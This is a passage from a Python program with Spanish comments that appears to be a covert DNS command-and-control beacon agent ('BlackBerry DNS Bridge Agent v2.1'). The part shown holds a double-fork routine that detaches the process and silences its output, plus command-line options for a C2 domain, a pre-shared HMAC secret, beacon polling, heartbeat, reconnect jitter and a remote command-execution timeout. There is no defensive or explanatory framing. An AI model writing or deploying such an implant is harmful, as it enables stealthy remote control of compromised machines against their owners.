# ══════════════════════════════════════════════════════════════════════════════
def _daemonize():
    """Fork doble para desligar del terminal por completo."""
    try:
        if os.fork() > 0:
            sys.exit(0)
    except AttributeError:
        # Windows no tiene fork — silenciar stdout/stderr directamente
        _silence()
        return

    os.setsid()

    try:
        if os.fork() > 0:
            sys.exit(0)
    except Exception:
        pass

    _silence()
    _log("Modo daemon activo")


def _silence():
    try:
        devnull = open(os.devnull, "w")
        sys.stdout = devnull
        sys.stderr = devnull
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════════════════════
#  ARGPARSE + ENTRADA
# ══════════════════════════════════════════════════════════════════════════════
def _args():
    global DNS_SERVER, DNS_PORT, C2_DOMAIN, HMAC_PRE_SHARED
    global POLL_INTERVAL, HB_INTERVAL, RECONNECT_BASE, RECONNECT_JITTER
    global DAEMON_MODE, DEBUG, EXEC_TIMEOUT

    p = argparse.ArgumentParser(
        description="BlackBerry DNS Bridge Agent v2.1",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    p.add_argument("-H", "--host",       default=DNS_SERVER,
                   help="IP del proxy DNS  (def: 127.0.0.1)")
    p.add_argument("-p", "--port",       type=int, default=DNS_PORT,
                   help="Puerto UDP       (def: 53)")
    p.add_argument("-d", "--domain",     default=C2_DOMAIN,
                   help="Dominio C2       (def: beacon.local)")
    p.add_argument("--hmac",             default=None,
                   help="HMAC pre-shared secret")
    p.add_argument("--poll",             type=float, default=POLL_INTERVAL,
                   help="Intervalo de poll en segundos (def: 3)")
    p.add_argument("--hb",               type=int, default=HB_INTERVAL,
                   help="Intervalo heartbeat en segundos (def: 60)")
    p.add_argument("--reconnect",        type=int, default=RECONNECT_BASE,
                   help="Base de reconexión en segundos (def: 10)")
    p.add_argument("--jitter",           type=int, default=RECONNECT_JITTER,
                   help="Jitter máximo en segundos (def: 8)")
    p.add_argument("--exec-timeout",     type=int, default=EXEC_TIMEOUT,
                   help="Timeout de ejecución de comandos (def: 60)")
    p.add_argument("--daemon",           action="store_true",
                   help="Modo daemon (fork + silenciar salida)")
    p.add_argument("--debug",            action="store_true",
                   help="Modo debug verboso")
    a = p.parse_args()

    DNS_SERVER      = a.host
    DNS_PORT        = a.port
    C2_DOMAIN       = a.domain.rstrip(".")
    POLL_INTERVAL   = a.poll
    HB_INTERVAL     = a.hb
    RECONNECT_BASE  = a.reconnect
    RECONNECT_JITTER = a.jitter
    EXEC_TIMEOUT    = a.exec_timeout
    DAEMON_MODE     = a.daemon
    DEBUG           = a.debug

    if a.hmac:
        HMAC_PRE_SHARED = a.hmac.encode()

    if DAEMON_MODE:
        _daemonize()


if __name__ == "__main__":
    _args()
    run()
